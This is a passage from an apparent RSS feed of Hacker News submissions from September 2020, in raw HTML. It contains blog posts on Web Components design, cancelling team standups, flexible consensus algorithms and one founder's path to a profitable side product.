Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581439">thread link</a>) | @headalgorithm
<br/>
September 24, 2020 | https://lea.verou.me/2020/09/the-failed-promise-of-web-components/ | <a href="https://web.archive.org/web/*/https://lea.verou.me/2020/09/the-failed-promise-of-web-components/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Web Components had so much potential to empower HTML to do more, and make web development more accessible to non-programmers and easier for programmers. Remember how exciting it was every time we got new shiny HTML elements that actually <em>do stuff</em>? Remember how exciting it was to be able to do sliders, color pickers, dialogs, disclosure widgets straight in the HTML, without having to include any widget libraries?</p>



<p>The promise of Web Components was that we‚Äôd get this convenience, but for a much wider range of HTML elements, developed much faster, as nobody needs to wait for the full spec + implementation process. We‚Äôd just include a script, and boom, we have more elements at our disposal!</p>



<p>Or, that was the idea. Somewhere along the way, the space got flooded by JS frameworks aficionados, who revel in complex APIs, overengineered build processes and dependency graphs that look like the roots of a banyan tree.</p>



<figure><img src="https://live.staticflickr.com/2025/32441377780_e3acf6de12_b.jpg" alt=""><figcaption>This is what the roots of a Banyan tree look like. <a href="https://www.flickr.com/photos/79721788@N00/32441377780/">Photo by David Stanley on Flickr (CC-BY)</a>. </figcaption></figure>



<p>Perusing the components on <a href="https://www.webcomponents.org/">webcomponents.org</a> fills me with anxiety, and I‚Äôm perfectly comfortable writing JS ‚Äî I write JS for a living! What hope do those who can‚Äôt write JS have? Using a custom element from the directory often needs to be preceded by a ritual of npm flugelhorn, import clownshoes, build quux, all completely unapologetically because ‚Äúhere is my truckload of dependencies, yeah, what‚Äù. Many steps are even omitted, likely because they are ‚Äúobvious‚Äù. Often, you wade through the maze only to find the component doesn‚Äôt work anymore, or is not fit for your purpose.</p>



<p>Besides setup, the main problem is that HTML is not treated with the appropriate respect in the design of these components. They are not designed as closely as possible to standard HTML elements, but <em>expect</em> JS to be written for them to do anything. HTML is simply treated as a shorthand, or worse, as merely a marker to indicate where the element goes in the DOM, with all parameters passed in via JS. I recall <a href="https://adactio.com/articles/12839#webcomponents">a wonderful talk by Jeremy Keith</a> a few years ago about this very phenomenon, where he discussed <a href="https://shop.polymer-project.org/">this e-shop Web components demo by Google</a>, which is the poster child of this practice. These are the entire contents of its <code>&lt;body&gt;</code> element:</p>



<pre><code>&lt;body&gt;
	&lt;shop-app unresolved=""&gt;SHOP&lt;/shop-app&gt;
	&lt;script src="node_assets/@webcomponents/webcomponentsjs/webcomponents-loader.js"&gt;&lt;/script&gt;
	&lt;script type="module" src="src/shop-app.js"&gt;&lt;/script&gt;
	&lt;script&gt;window.performance&amp;&amp;performance.mark&amp;&amp;performance.mark("index.html");&lt;/script&gt;
&lt;/body&gt;</code></pre>



<p>If this is how Google is leading the way, how can we hope for contributors to design components that follow established HTML conventions?</p>



<p>Jeremy criticized this practice from the aspect of backwards compatibility: when JS is broken or not enabled, or the browser doesn‚Äôt support Web Components, the entire website is blank. While this is indeed a serious concern, my primary concern is one of <strong>usability</strong>: <strong>HTML is a lower barrier to entry language</strong>. Far more people can write HTML than JS. Even for those who do eventually write JS, it often comes after spending years writing HTML &amp; CSS.</p>



<p>If components are designed in a way that requires  JS, this excludes thousands of people from using them. And even for those who <em>can</em> write JS, HTML is often easier: you don‚Äôt see many people rolling their own sliders or using JS-based ones once <code>&lt;input type="range"&gt;</code> became widely supported, right?</p>



<p>Even when JS is unavoidable, it‚Äôs not black and white. A well designed HTML element can reduce the amount and complexity of JS needed to a minimum. Think of the <code><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog">&lt;dialog&gt;</a></code> element: it usually does require *some* JS, but it‚Äôs usually rather simple JS. Similarly, the <code>&lt;video&gt;</code> element is perfectly usable just by writing HTML, and has a comprehensive JS API for anyone who wants to do fancy custom things.</p>



<p>The other day I was looking for a simple, dependency free, tabs component. You know, the canonical example of something that is easy to do with Web Components, the example 50% of tutorials mention. I didn‚Äôt even care what it looked like, it was for a testing interface. I just wanted something that is small and works like a normal HTML element. Yet, it proved so hard I ended up writing my own!</p>



<h3>Can we fix this?</h3>



<p>I‚Äôm not sure if this is a design issue, or a documentation issue. Perhaps for many of these web components, there are easier ways to use them. Perhaps there are vanilla web components out there that I just can‚Äôt find. Perhaps I‚Äôm looking in the wrong place and there is another directory somewhere with different goals and a different target audience. </p>



<p>But if not, and if I‚Äôm not alone in feeling this way, we need a directory of web components with strict inclusion criteria:</p>



<ul><li><strong>Plug and play.</strong> No dependencies, no setup beyond including one <code>&lt;script&gt;</code> tag. If a dependency is absolutely <em>needed</em> (e.g. in a map component it doesn‚Äôt make sense to draw your own maps), the component loads it automatically if it‚Äôs not already loaded.</li><li>Syntax and API follows <a href="https://www.smashingmagazine.com/2017/02/designing-html-apis/"><strong>conventions established by built-in HTML elements</strong></a> and anything that <em>can</em> be done without the component user writing JS, <em>is</em> doable without JS, per <a href="https://www.w3.org/2001/tag/doc/leastPower.html">the W3C principle of least power</a>.</li><li><strong>Accessible by default</strong> via sensible ARIA defaults, just like normal HTML elements.</li><li><strong>Themable</strong> via <code><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/::part">::part()</a></code>, selective inheritance and custom properties. Very minimal style by default. Normal CSS properties should just ‚Äúwork‚Äù to the the extent possible.</li><li><strong>Only one component of a given type</strong> in the directory, that is <strong>flexible</strong> and <strong>extensible</strong> and continuously iterated on and improved by the community. Not 30 different sliders and 15 different tabs that users have to wade through. No branding, no silos of ‚Äúcomponent libraries‚Äù. Only elements that are designed as closely as possible to what a browser would implement in every way the current technology allows.</li></ul>



<p>I would be up for working on this if others feel the same way, since that is not a project for one person to tackle. <em>Who‚Äôs with me?</em></p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://lea.verou.me/2020/09/the-failed-promise-of-web-components/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581439</guid>
            <pubDate>Thu, 24 Sep 2020 17:58:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Routines of Substitution: John von Neumann‚Äôs Work on Software Development,1945‚Äì8]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581433">thread link</a>) | @bindidwodtj
<br/>
September 24, 2020 | https://book4you.org/book/3661323/79ef12 | <a href="https://web.archive.org/web/*/https://book4you.org/book/3661323/79ef12">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://book4you.org/book/3661323/79ef12</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581433</guid>
            <pubDate>Thu, 24 Sep 2020 17:58:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We cancelled standups and let the team build]]>
            </title>
            <description>
<![CDATA[
Score 182 | Comments 226 (<a href="https://news.ycombinator.com/item?id=24581360">thread link</a>) | @thellimist
<br/>
September 24, 2020 | https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened | <a href="https://web.archive.org/web/*/https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-w-id="0ea0c8ae-8333-a516-8908-f86a85ef9373"><p>üëã I'm Julian, the Cofounder of <a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a>. We're building dashboards and alerts that plug into Github - helping engineering leaders build happier, healthier, more productive teams. </p><p>We wanted to share a quick story on why "we cancelled standups and just let the team build". </p><p>It's not as crazy as it sounds so let's dive an and see what happened..</p><p>‚Äç</p><h2>So.. why did we do this?</h2><p>‚Äç</p><h4>At first we were doing great</h4><p>At first the team was moving at (what seemed to be) the speed of light. We were handling issues, fixing bugs, launching features. We even tackled our biggest, nagging pieces of technical debt. Dream come true, right? As a team of technical founders, we patted ourselves on the back for a job well done. It felt like we couldn't be stopped.</p><p>‚Äç</p><h4>But things quickly turned around on us..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f593cc6238ba8f66e10c539_Screenshot_2020-09-08_at_10.22.47_PM.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>And we noticed an odd pattern happening daily..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc18e8a5d4f630d45d4f2_2.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>We brought this data to the team and uncovered a few issues.. Here are some notes from our retro</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6ccdaf16b35490656f58c6_retro-summary.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h2>So.. What did we do?</h2><p>‚Äç</p><h4>We asked for suggestions. Here are the results..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cd0bbf86c9040f44cc92b_retro-votes.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h4>Top Votes:&nbsp;</h4><ol start="" role="list"><li>Cancel Standup</li><li>Work on 'Fun Projects'</li></ol><p>‚Äç</p><p>Might seem crazy but we like to empower the team to improve themselves. &nbsp;We take pride in our ability to iterate our process as often as possible. </p><p>Plus we've got Haystack to see if our changes are working.</p><p>So why not?&nbsp;Let's try it for a week. Revert back if it isn't working out.</p><p>‚Äç</p><h2>We cancelled standup and let the team 'just build'.</h2><p>‚Äç</p><h4>We did agree on some ground rules though..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cd49e16b35472506f74b8_fun-sprint-etiquette.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h4>And with those rules in place we were off üí®üö£‚Äç‚ôÄÔ∏è</h4><p>Without hesitation we kicked off. Very surprised to see how many 'fun projects' the team already had in mind. It didn't take much prompting at all.</p><p>‚Äç</p><h2>And.. We had our most productive week EVER:</h2><p>‚Äç</p><h4>We recovered our Throughput!</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc209c0fe2df87e4583c0_3.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>Improved our Cycle Time (reversing the trend)!</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc20f1523b25682b1fe92_4.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>Got our 'deep work' back.</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc2169b6b491e6744cd11_5.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>And tackled projects we've wanted to do for MONTHS.</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc2313f047785e14bf727_11.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h4>Most Importantly..We DECREASED BURNOUT</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cd71016b35499cd6f7f8d_before.png" loading="lazy" alt=""></p></figure><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc24b1523b2af6fb20099_13.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><p>‚Äç</p><h2>It was a HUGE success.</h2><p>The experiment went better than we could have hoped. By removing standups and letting the team work on new, exciting projects we were able to get out of the funk we found ourselves in. Without skipping a beat our team is refreshed, recovered, and excited.</p><p>‚Äç</p><p>‚Äç</p><h2>Does this mean no more stand-ups or roadmaps?</h2><p>Well.. No. But we are considering it. </p><p>‚Äç</p><p>We'll continue to experiment until we find the right balance. Today, we do 2-3 in-person standups per week with async standups on Slack the other days. We carefully document our work in Notion everyday and have Weekly Kick-Off meetings every Monday.</p><p>‚Äç</p><p>The new process is working well so far - plus we have Haystack to help us check-in and make changes if needed.</p><p>‚Äç</p><p>‚Äç</p><h2>So.. how often do YOU experiment with process?</h2><p>The 'right' process is a constantly moving target. What works one day might not work the next. It's important to empower your team to make changes when necessary and improve their day-to-day experience. </p><p>‚Äç</p><p>If you want to experiment like a mad man(woman) on your process. AGGRESSIVELY enable improvement. Empower your team to improve their own work environment - then come check out <a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a> and we'll show you how to implement a culture of continuous improvement.</p><p>‚Äç</p><p>Either way, hope our story got your wheels turning!</p><p>‚Äç</p><p>‚Äç</p><p>‚Äç</p><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5123c19bb423a1492c778d_Haystack_Designed_Presentation.png" loading="lazy" alt=""></p></figure><p><a href="https://usehaystack.io/?utm_source=blog&amp;utm_medium=subscription-sequence&amp;utm_campaign=3-ways-to-identify-blockers">Haystack</a> helps engineering leaders identify blockers and trends. Instead of guessing if you're improving, or constantly bothering your team for progress updates, simply use Haystack to get insights in your inbox every morning. Plus a dashboard to track improvements over time.</p><p>‚Äç</p><p><a href="https://usehaystack.io/?utm_source=blog&amp;utm_medium=subscription-sequence&amp;utm_campaign=3-ways-to-identify-blockers">Try it for free</a></p><p>‚Äç</p></div></div>]]>
            </description>
            <link>https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581360</guid>
            <pubDate>Thu, 24 Sep 2020 17:52:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Take the test: your 'tech debt credit score']]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581144">thread link</a>) | @euirqe
<br/>
September 24, 2020 | https://www.stepsize.com/tech-debt-credit-score-test | <a href="https://web.archive.org/web/*/https://www.stepsize.com/tech-debt-credit-score-test">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.stepsize.com/tech-debt-credit-score-test</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581144</guid>
            <pubDate>Thu, 24 Sep 2020 17:33:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Consensus Algorithms at Scale ‚Äì Part 3]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581091">thread link</a>) | @sougou
<br/>
September 24, 2020 | https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-3-use-cases | <a href="https://web.archive.org/web/*/https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-3-use-cases">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><figure id="w-node-9c5fe811ec3e-ca993012"><p><img src="https://assets-global.website-files.com/5ef5a4d4da0d67ccda9b5588/5f6bda6f1d50dc20271ab64d_part3-07.png" loading="lazy" alt=""></p></figure><p><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-1"><em>Consensus Algorithms at Scale - Part 1 <br>‚Äç</em></a><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-2"><em>Consensus Algorithms at Scale - Part 2</em></a></p><h2>Recap</h2><p>Here is a recap of what we covered in the last blog:</p><ul role="list"><li>Durability is the main reason why we want to use a consensus system.</li><li>Since Durability is use-case dependent, we made it an abstract requirement requiring the consensus algorithms to assume nothing about the durability requirements.</li><li>We started off with the original properties of a consensus system as defined by <a href="https://en.wikipedia.org/wiki/Paxos_(computer_science)">Paxos</a> and modified it to make it usable in practical scenarios: instead of converging on a value, we changed the system to accept a series of requests.</li><li>We narrowed our scope down to single leader systems.</li><li>We came up with a new set of rules that are agnostic of durability. The essential claim is that a system that follows these rules will be able to satisfy the requirements of a consensus system. Specifically, we excluded some requirements like majority quorum that have previously been used as core building blocks in consensus algorithms.</li></ul><h2>Consensus Use Cases</h2><p>If there was no need to worry about a majority quorum, we would have the flexibility to deploy any number of nodes we require. We can designate any subset of those nodes to be eligible leaders, and we can make durability decisions without being influenced by the above two decisions. This is exactly what many users have done with <a href="https://vitess.io/">Vitess</a>. The following use cases are loosely derived from real production workloads:</p><ul role="list"><li>We have a large number of replicas spread over many data centers. Of these, we have fifteen leader capable nodes spread over three data centers. We don‚Äôt expect two nodes to go down at the same time. Network partitions can happen, but only between two data centers; a data center will never be totally isolated. A data center can be taken down for planned maintenance.</li><li>We have four zones with one node in each zone. Any node can fail. A zone can go down without notice. A partition can happen between any two zones.</li><li>We have six nodes spread over three zones. Any node can fail. A zone can go down without notice. A partition can happen between any two zones.</li><li>We have two regions, each region has two zones. We don‚Äôt expect more than one zone to go down. A region can be taken down for maintenance, in which case we want to proactively transfer writes to the other region.</li></ul><p>I have not seen anyone ask for a durability requirement of more than two nodes. But this may be due to difficulties dealing with corner cases that MySQL introduces due to its semi-sync behavior. On the other hand, these settings have served the users well so far. So, why become more conservative?</p><p>These configurations are all uncomfortable for a majority based consensus system. More importantly, these flexibilities will encourage users to experiment with even more creative combinations and allow them to achieve better trade-offs.</p><h2>Reasoning about Flexible Consensus</h2><p>The configurations in the previous section seem to be all over the place. How do we design a system that satisfies all of them, and how do we future-proof ourselves against newer requirements?</p><p>There is a way to reason about why this flexibility is possible. This is because the two cooperating algorithms (Request and Election) share a common view of the durability requirements, but can otherwise operate independently.</p><p>For example, let us consider the five node system. If a user does not expect more than one node to fail at any given time, then they would specify their durability requirement as two nodes.</p><p>The leader can use this constraint to make requests durable: as soon as the data has reached one other node, it has become durable. We can return success to the client.</p><p>On the election side, if there is a failure, we know that no more than one node could have failed. This means that four nodes will be reachable. At least one of those will have the data for all successful requests. This will allow the election process to propagate that data to other nodes and continue accepting new requests after a new leader is elected.</p><p>In other words, a single durability constraint dictates both sides of the behavior; if we can find a formal way to describe the requirements, then a request has to fulfil those requirements. On the other hand, an election needs to reach enough nodes to intersect with the same requirements.</p><figure id="w-node-f2e13589f425-ca993012"><p><img src="https://assets-global.website-files.com/5ef5a4d4da0d67ccda9b5588/5f6bdb8ae991420d4c1c808f_request-election-01.jpg" loading="lazy" alt=""></p></figure><p>For example, if durability is achieved with 2/5 nodes, then the election algorithm needs to reach 4/5 nodes to intersect with the durability criteria. In the case of a majority quorum, both of these are 3/5. But our generalization will work for any arbitrary property.</p><h2>Worst Case Scenario</h2><p>In the above five node case, if two nodes fail, the failure tolerance has been exceeded. We can only reach three nodes. If we don‚Äôt know about the state of the other two nodes, we will have to assume the worst case scenario that a durable request could have been accepted by the two unreachable nodes. This will cause the election process to stall.</p><p>If this were to happen, the system has to allow for a compromise: abandon the two nodes and move forward. Otherwise, the loss of availability may become more expensive than the potential loss of that data.</p><h2>Practical Balance</h2><p>A two-node durability does not always mean that the system will stall or lose data. A very specific sequence of failures have to happen:</p><ul role="list"><li>Leader accepts a request</li><li>Leader attempts to send the request to multiple recipients</li><li>Only one recipient receives and acknowledges the request</li><li>Leader returns a success to the client</li><li>Both the leader and that recipient crash</li></ul><p>This type of failure can happen if the leader and the recipient node are network partitioned from the rest of the cluster. We can mitigate this failure by requiring the ackers to live across network boundaries.</p><p>The likelihood of a replica node in one cell failing after an acknowledgment, and a master node failing in the other cell after returning success, is much lower. This failure mode is rare enough that many users treat this level of risk as acceptable.</p><h2>Orders of Magnitude</h2><p>The most common operation performed by a consensus system is the completion of requests. In contrast, a leader election generally happens in two cases: taking nodes down for maintenance, or upon failure.</p><p>Even in a dynamic cloud environment like Kubernetes, it would be surprising to see more than one election per day for a cluster, whereas such a system could be serving hundreds of requests per second. That amounts to many orders of magnitude in difference between a request being fulfilled and a leader election.</p><p>This means that we must do whatever it takes to fine tune the part that executes requests, whereas leader elections can be more elaborate and slower. This is the reason why we have a bias towards reducing the durability settings to the bare minimum. Expanding this number can adversely affect performance, especially the tail latency.</p><p>At <a href="https://youtube.com/">YouTube</a>, although the quorum size was big, a single ack from a replica was sufficient for a request to be deemed completed. On the other hand, the leader election process had to chase down all possible nodes that could have acknowledged the last transaction. We did consciously trade off on the number of ackers to avoid going on a total wild goose chase.</p><p>In the next blog, we will take a short detour. Shlomi Noach will talk about how some of these approaches work with MySQL and semi-sync replication. Following this, we will continue pushing forward on the implementation details of these algorithms.</p><p>‚Äç</p><p><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-1"><em>Consensus Algorithms at Scale - Part 1 <br>‚Äç</em></a><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-2"><em>Consensus Algorithms at Scale - Part 2</em></a></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-3-use-cases</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581091</guid>
            <pubDate>Thu, 24 Sep 2020 17:29:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two and a half years of building products]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581041">thread link</a>) | @Jetroid
<br/>
September 24, 2020 | https://www.alexwest.co/two_and_a_half_years | <a href="https://web.archive.org/web/*/https://www.alexwest.co/two_and_a_half_years">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>

        

        <h2><u>TL;DR (Too Lazy Didn't Read)</u> üìï</h2>

        

        <p>At last I did it! After more than two years of constant trial and error, I managed to build a successful, profitable product and achieve financial independence!</p>

        <p>In this blog post I will explain in detail what happened and how I went from no idea to $2k MRR with <a target="_blank" href="https://www.getcyberleads.com/">Cyberleads</a> inside six months.</p>

		<p>The story of I found a good B2B idea. How I launched it. How I found a good distribution channel and grew it. And how you can do it too.</p>

		<p>No bullshit. Straight up the real story. Moving abroad. Starting a full time job. Doubting myself. Crying. Finding Cyberleads. Launching it. Growing it. Everything.</p>

        <p>Ok, let‚Äôs do it. Let‚Äôs go back in time to the beginning of 2020.. January 4th‚Ä¶</p>


        

        

        <p>I‚Äôm getting off the plane. I‚Äôm in Milan, Italy. Going to get the bus to find the place I would call home for the next year. A little room, in a house with four Italian room mates I've never seen before in my life.</p>

        <p>The weather is perfect. I‚Äôm excited and nervous at the same time. I keep asking myself, ‚ÄúWhat the fuck am I doing here..‚Äù</p>

        <p>The reason I‚Äôm here is because of <a target="_blank" href="https://www.epilepsyblocker.com/">‚ÄúEpilepsy Blocker‚Äù</a>, a product I built in 2019. It's a chrome extension that protects people with photosensitive epilepsy while browsing the web.</p>

        <p>It managed to get the attention of the CEO of a big healthcare startup.</p>

        <p>That company builds life saving, FDA cleared medical devices for people with neurological conditions. Epilepsy also. Hence, the interest. He invited me for a Zoom chat, and we discussed for close to two hours.</p>

        <p>We talked about everything, and in our chat he explained what they do. He explained that they have offices in Boston, Milan and South Korea, and most importantly, that the door is open for me if I ever wanted to join.</p>

        <p>I learnt that they use AI and other cool technologies. That they work with organizations like NASA and MIT. That one of the founders is an MIT professor. That they offer fantastic perks and benefits. Free lunch every day. Free gym membership. Free weekly massages. Free MacBook Pro and gear. Summer offices in Sardinia. An international team full of young and interesting people. A great salary.</p>

        <p>But no matter how great the job, I wasn‚Äôt interested. Actually, I thought that there was a slight possibility they might buy EpilepsyBlocker. So, I was even disappointed.</p>

        <p>I can't work for a company! That's like selling your soul to the devil. No matter how cool the company is, it still felt like golden handcuffs to me.</p>

        <p>But I was running out of time. And I was going no where, as far as generating revenue is concerned. I had been building products non stop for two years, and was struggling at around $100/month.</p>

        <p>I was also finishing up uni at this point, and after that I would have to find a full time job. </p>

        <p>I mean.. you have to, right? You either study or you work. You can't fuck around on your laptop all day, pretending to be building businesses! That was my parents' mentality, anyway. And I had to respect it.</p>

        <p>This was definitely the best job I would ever land straight out of uni. Especially with my grades and credentials.</p>

        <p>And I also wanted a change. Moving abroad excited me.</p>

        <p>So I took it. I emailed them and told them would start in January 2020, after I get my degree. I had a few months, but I still didn't manage to build a successful product. No matter how hard I tried.</p>

        <p>I remember reading this quote:</p>

        <p><b><u>"When in doubt, do the exact opposite of what you are doing."</u></b></p>

        <br>

        
        

        <p>So here I am, I've arrived in my small bedroom in Milan, and I'm getting ready to go to "work" tomorrow. At the office. Like a proper grown up.</p>

        <p>I set my alarm clock for 07:00AM.</p>

        <p>I saw my jeans, white polo shirt and watch on my chair. My shoes nice and clean. All ready to be worn the next day. Ready to make me look professional.</p>

        <p>Fuck.. I'm an adult now.</p>

        <p>Only my closest friends and some members of my family know about this, but at that moment, I started crying like a child.</p>

        <p>I wasn't afraid that I was going to hate the job. The opposite, actually. I was afraid that I was going to love it and forget everything about my goals.</p>

        <p>I was afraid that in the blink of an eye, my life will be work during the week, and partying on the week ends. Before I know it, three years will have gone by and I'll still be at the same job. I will have forgotten everything about my goals and dreams. My side projects would seem like a very distant dream I can hardly even remember.</p>

        
        <p><i>"Oh, yeah. Back in the day when I used to build little side projects.. Cute."</i></p>
        

        <p>I promised I wouldn't stop working on my personal projects, no matter how tired I am.</p>

        <p>So, yeah.. Picture this.</p>

        <p>A grown ass man crying because he would start a comfy job. At twenty five years of age.</p>

        <p>It's pathetic. I know. But it's the truth. And in this blog post, you'll get nothing but the truth.</p>


        
        

        <p>Luckily, reality was different to my expectations.</p>

        <p>There were no NASA scientists at lunch break. I wasn't saving lives with my code on a casual Tuesday. And I definitely wasn't discussing about AI, side projects or making the world a better place with my colleagues.</p>

        <p>Welcome to reality!</p>

        <p>I was tucked in a corner, with my brand new laptop, programming an internal dashboard for the logistics team.</p>

        <p>Clocking in eight hours per day, plus one hour for lunch break.</p>

        <p>I would enter the building at 10:00 AM and leave at 19:00 PM. That was pitch dark in January/February.</p>

        <p>It was depressing. I wasn't getting close with my colleagues either. All our conversations were at surface level.</p>

        <p>Things were like I had predicted. I had daily fuel and motivation to change my life.</p>

        <p>Initially, I thought that something was wrong with me. That I'm a "special flower", who doesn't like working in an office.</p>

        <p>But no.</p>

        <p>One day, during lunch break, I overheard my colleagues talking about sleep. Somehow the conversation ended up in how lovely it is to lie down in bed on a Friday night. Knowing that you don't have to wake up early for the next two days. And how depressing Sundays are because you know you have to go to work the next day.</p>

        <p>"Ok, so I'm not the only one."</p>

        <p>I'm not the cancerous cell growing inside this company. And I'm not special.</p>

        <p>No one enjoys working on a desk for eight hours a day, five days a week. Week after week. Month after month. Year after year. Decade after decade. No matter how cool the company is or fulfilling it's mission is.</p>

        <p>Most people don't know you can actually escape. Or maybe they don't have the balls to try.</p>

        <p>All I needed was a plan..</p>

        

        

        <p>Hindsight 20-20, but three books I happened to read in December and January helped me shape my approach and strategy.</p>

        

        <p><u>- The Alchemist by Paulo Coelho</u></p>

        <p>This book was short, sweet, and easy to read. It's about a boy that has a dream and works hard for it.</p>

        <p>Bullshit, really. Just a bit of inspiration to keep going.</p>

        

        <p><u>- Atomic Habits</u></p>

        <p>The most practical book I've ever read. It explains how progress happens slowly, then all at once. All you have to do is focus on your inputs/habits and wait for the rewards.</p>

       	

        <p><u>- Millionaire Fastlane</u></p>

        <p>Please, for the love of god, ignore the title! It's cringe as fuck, and I have a really hard time recommending it for that reason. But, if you ignore the title and the first twenty pages of the book where he talks about chicks and lambos, you'll thank me. The principles in the book are timeless and very close to the indiehacking philosophy.</p>

        <p>Three concepts from this book really helped me solidify some raw ideas I had in my mind.</p>

        <p>They deserve chapters of their own.</p>

        


        

        <p>The first concept is that making your passion your job is dangerous.</p>

        <p>It can mix up your incentives and make you hate what you once loved.</p>

        <p>I had personal experience with this. Again, I'm getting dangerously transparent with what I'm about to say, but fuck it.</p>

        <p>I was looking at how many people have photosensitive epilepsy and remember being dissapointed that the market was small.</p>

        <p>Damn it. Couldn't I have built a solution for more people? Couldn't it have been a bigger market?</p>

        <p>I caught myself off guard. What the fuck. My incentives had started getting mixed up before I had even started.</p>

        <p>It's a wonderful thing that so few people have this. Not a negative.</p>

        <p>Now, EpilepsyBlocker is completely free, and always will be. I'm not trying to make it a business, and never will.</p>

        <p>So stop trying to build products that are your "passion". What you want is a business that gives you the freedom to explore your passions and hobbies, without having to worry about making money out of them.</p>

        

        

        <p>The second concept is that you don't have to be unique or try to change the world.</p>

        <p>Trying to change the external, the whole world around you, is a very naive way of thinking.</p>

        <p>What you want is to change your world first, and then the rest of the world.</p>

        <p>Actually, changing yourself is the best way to change the world anyway.</p>

        <p>Heck. If you are so keen like you say you are, do something more boring, make money, and donate like 50% of your income to charities, every month.</p>

        <p>What is better?</p>

        <p>Trying to build a romantic, cool, probably B2C idea to help humanity? Struggle to make a profit and build an average product at best?</p>

        <p>Or build a less romantic, profitable product? One that you enjoy working on? Build a stellar product, make a lot ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.alexwest.co/two_and_a_half_years">https://www.alexwest.co/two_and_a_half_years</a></em></p>]]>
            </description>
            <link>https://www.alexwest.co/two_and_a_half_years</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581041</guid>
